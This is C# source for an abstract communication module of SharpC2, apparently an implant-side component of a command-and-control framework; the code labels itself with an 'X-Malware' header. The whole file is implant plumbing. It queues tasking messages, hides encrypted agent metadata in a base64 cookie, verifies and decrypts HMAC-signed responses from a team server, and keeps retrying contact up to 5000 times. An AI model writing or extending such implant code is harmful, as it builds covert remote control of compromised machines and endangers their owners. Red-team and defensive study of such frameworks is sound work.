using System;
using System.Collections.Generic;
using System.Net;

abstract class CommModule
{
    static string AgentID;
    public ModuleStatus ModuleStatus { get; private set; } = ModuleStatus.Stopped;

    protected CryptoController Crypto;
    protected Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
    protected Queue<AgentMessage> Outbound = new Queue<AgentMessage>();

    static int MaxRetryCount = 5000;
    static int RetryCount = 0;

    public CommModule(string agentID)
    {
        AgentID = agentID;
    }

    public virtual void Start(CryptoController crypto)
    {
        Crypto = crypto;
        ModuleStatus = ModuleStatus.Running;
    }

    public virtual void Stop()
    {
        ModuleStatus = ModuleStatus.Stopped;
    }

    public virtual ModuleStatus GetModuleStatus()
    {
        return ModuleStatus;
    }

    public virtual void SendData(AgentMessage message)
    {
        Outbound.Enqueue(message);
    }

    public virtual bool RecvData(out AgentMessage message)
    {
        if (Inbound.Count > 0)
        {
            message = Inbound.Dequeue();
            return true;
        }
        else
        {
            message = null;
            return false;
        }
    }

    public virtual WebClient GetWebClient()
    {
        var client = new WebClient();
        var metadata = Crypto.Encrypt(GetMetadata());

        client.Headers.Clear();
        client.Headers.Add("X-Malware", "SharpC2");
        client.Headers[HttpRequestHeader.Cookie] = $"Metadata={Convert.ToBase64String(metadata)}";

        return client;
    }

    public virtual AgentMetadata GetMetadata()
    {
        return new AgentMetadata
        {
            AgentID = AgentID
        };
    }

    public virtual void ProcessTeamServerResponse(byte[] response)
    {
        if (Crypto.VerifyHMAC(response))
        {
            var message = Crypto.Decrypt<AgentMessage>(response);

            if (message != null)
            {
                Inbound.Enqueue(message);
            }
        }
    }

    public virtual void IncrementRetryCount()
    {
        RetryCount++;

        if (RetryCount == MaxRetryCount)
        {
            ModuleStatus = ModuleStatus.Stopped;
        }
    }
}